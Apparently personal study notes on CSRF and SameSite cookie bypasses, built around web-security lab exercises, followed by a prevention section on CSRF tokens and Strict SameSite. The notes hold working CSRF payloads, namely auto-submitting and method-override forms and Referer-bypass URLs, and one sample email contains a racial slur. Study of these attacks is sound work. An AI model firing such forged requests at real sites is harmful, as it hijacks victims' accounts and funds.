AtAtJzknBmWcTuFa9G1f1+19jbY2N01lUrXHgDAQhAAAIQgAAEphKQcnvXwID654Jlrns3MdGh9wxOnFNn3S4GYak6EIAABCAAAQhAoJIEBvv7peUCMWd8dPelm5heN9A/bWIwlh8IQAACEIAABCAAgXoQ+P9SyDD/K352OgAAAABJRU5ErkJggg==)## **What's the difference between a site and an origin?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one. Although they're closely related, it's important not to use the terms interchangeably as conflating the two can have serious security implications.</span>

<table>
<tbody><tr><td colspan="1" rowspan="1"><p><strong>Request from</strong></p></td><td colspan="1" rowspan="1"><p><strong>Request to</strong></p></td><td colspan="1" rowspan="1"><p><strong>Same-site?</strong></p></td><td colspan="1" rowspan="1"><p><strong>Same-origin?</strong></p></td></tr><tr><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">https://example.com</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">https://example.com</code></p></td><td colspan="1" rowspan="1"><p>Yes</p></td><td colspan="1" rowspan="1"><p>Yes</p></td></tr><tr><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">https://app.example.com</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">https://intranet.example.com</code></p></td><td colspan="1" rowspan="1"><p>Yes</p></td><td colspan="1" rowspan="1"><p>No: mismatched domain name</p></td></tr><tr><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">https://example.com</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">https://example.com:8080</code></p></td><td colspan="1" rowspan="1"><p>Yes</p></td><td colspan="1" rowspan="1"><p>No: mismatched port</p></td></tr><tr><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">https://example.com</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">https://example.co.uk</code></p></td><td colspan="1" rowspan="1"><p>No: mismatched eTLD</p></td><td colspan="1" rowspan="1"><p>No: mismatched domain name</p></td></tr><tr><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">https://example.com</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">http://example.com</code></p></td><td colspan="1" rowspan="1"><p>No: mismatched scheme</p></td><td colspan="1" rowspan="1"><p>No: mismatched scheme</p></td></tr></tbody>
</table>

## **How does SameSite work?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">SameSite works by enabling browsers and website owners to limit which cross-site requests, if any, should include specific cookies. This can help to reduce users' exposure to CSRF attacks.</span>

<span style="font-size: 17px">All major browsers currently support the following SameSite restriction levels:</span>

- `Strict`
- `Lax`
- `None`

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Developers can manually configure a restriction level for each cookie they set, giving them more control over when these cookies are used. To do this, they just have to include the </span>`SameSite`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> attribute in the </span>`Set-Cookie`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> response header.</span>

```http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

### **<span style="font-size: 19px">Strict :</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If a cookie is set with the </span>`SameSite=Strict`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> attribute, if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.</span>

### **<span style="font-size: 19px">Lax :</span>**

`Lax`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met.</span>

- <span style="font-size: 17px">The request uses the </span>`GET`<span style="font-size: 17px"> method.</span>

- <span style="font-size: 17px">The request resulted from a top-level navigation by the user, such as clicking on a link.</span>

### **<span style="font-size: 19px">None :</span>**

### <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If a cookie is set with the </span>`SameSite=None`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> attribute, this effectively disables SameSite restrictions altogether, regardless of the browser. As a result, browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites</span>.

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">There are legitimate reasons for disabling SameSite, such as when the cookie is intended to be used from a third-party context and doesn't grant the bearer access to any sensitive data or functionality.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">When setting a cookie with </span>`SameSite=None`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">, the website must also include the </span>`Secure`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set.</span>

## **Bypassing SameSite Lax restrictions using GET requests**

**Payload :**

<span style="font-size: 17px">If GET Mwthod is not allowed use \_method in the GET request using the thing which is allowed </span>

```
GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
```

```javascript
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">if an ordinary </span>`GET`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the </span>`_method`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> parameter in forms, which takes precedence over the normal method for routing purposes.</span>

```javascript
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

## **Bypassing SameSite restrictions using on-site gadgets**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If a cookie is set with the </span>`SameSite=Strict`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">As far as browsers are concerned, these client-side redirects aren't really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.</span>

```javascript
<html>
<body>
    <form  method="GET" action="https://0a24009804fa37e4802cd02000430015.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="nigga1@gmail.com">
        <input required type="hidden" name="_method" value="POST">
    </form>
    <script>
            document.forms[0].submit();
    </script>
</body>
</html>
```

## **Bypassing SameSite restrictions via vulnerable sibling domains**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Whether you're testing someone else's website or trying to secure your own, it's essential to keep in mind that a request can still be same-site even if it's issued cross-origin</span>

## **Bypassing SameSite Lax restrictions with newly issued cookies**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Cookies with </span>`Lax`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> SameSite restrictions aren't normally sent in any cross-site </span>`POST`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> requests, but there are some exceptions.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">if a website doesn't include a </span>`SameSite`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> attribute when setting a cookie, Chrome automatically applies </span>`Lax`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> restrictions by default.</span>

# **Bypassing Referer-based CSRF defenses**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">some applications make use of the HTTP </span>`Referer`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This approach is generally less effective and is often subject to bypasses.</span>

#### **<span style="font-size: 21px">Referer header</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The HTTP Referer header (which is inadvertently misspelled in the HTTP specification) is an optional request header that contains the URL of the web page that linked to the resource that is being requested.</span>

## **Validation of Referer depends on header being present**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Some applications validate the </span>`Referer`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> header when it is present in requests but skip the validation if the header is omitted.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">In this situation, an attacker can craft their </span>[CSRF exploit](https://portswigger.net/web-security/csrf)<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> in a way that causes the victim user's browser to drop the </span>`Referer`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> header in the resulting request.</span>

```javascript
<meta name="referrer" content="never">
```

## **Validation of Referer can be circumvented**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Some applications validate the </span>`Referer`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> header in a naive way that can be bypassed. For example, if the application validates that the domain in the </span>`Referer`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> starts with the expected value, then the attacker can place this as a subdomain of their own domain.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">This is for adding a referrrer header to the http request.</span>

```
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
```

```http
http://vulnerable-website.com.attacker-website.com/csrf-attack
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">if the application simply validates that the </span>`Referer`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> contains its own domain name, then the attacker can place the required value elsewhere in the URL</span>

```http
http://attacker-website.com/csrf-attack?vulnerable-website.com
```

# **How to prevent [CSRF](https://portswigger.net/web-security/csrf) vulnerabilities**

## **1. Use CSRF tokens :**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">most robust way to defend against CSRF attacks is to include a CSRF token within relevant requests. The token must meet the following criteria:</span>

- <span style="font-size: 17px">Unpredictable with high entropy, as for session tokens in general.</span>

- <span style="font-size: 17px">Tied to the user's session.</span>

- <span style="font-size: 17px">Strictly validated in every case before the relevant action is executed</span>

### **<span style="font-size: 17px">How should CSRF tokens be generated?</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">CSRF tokens should contain significant entropy and be strongly unpredictable, with the same properties as session tokens in general.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">use a cryptographically secure pseudo-random number generator (CSPRNG), seeded with the timestamp when it was created plus a static secret.</span>

### **<span style="font-size: 17px">How should CSRF tokens be transmitted?</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">CSRF tokens should be treated as secrets and handled in a secure manner throughout their lifecycle. An approach that is normally effective is to transmit the token to the client within a hidden field of an HTML form that is submitted using the POST method.</span>

### **<span style="font-size: 17px">How should CSRF tokens be validated?</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">When a CSRF token is generated, it should be stored server-side within the user's session data. When a subsequent request is received that requires validation, the server-side application should verify that the request includes a token which matches the value that was stored in the user's session. This validation must be performed regardless of the HTTP method or content type of the request.</span>

## **Use Strict [SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) cookie restrictions**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">In addition to implementing robust CSRF token validation, we recommend explicitly setting your own SameSite restrictions with each cookie you issue. By doing so, you can control exactly which contexts the cookie will be used in, regardless of the browser</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">you should use the </span>`Strict`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> policy by default, then lower this to </span>`Lax`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> only if you have a good reason to do so. Never disable SameSite restrictions with </span>`SameSite=None`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> unless you're fully aware of the security implications</span>

## **Be wary of cross-origin, same-site attacks**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Although properly configured SameSite restrictions provide good protection from cross-site attacks, it's vital to understand that they are completely powerless against cross-origin, same-site attacks</span>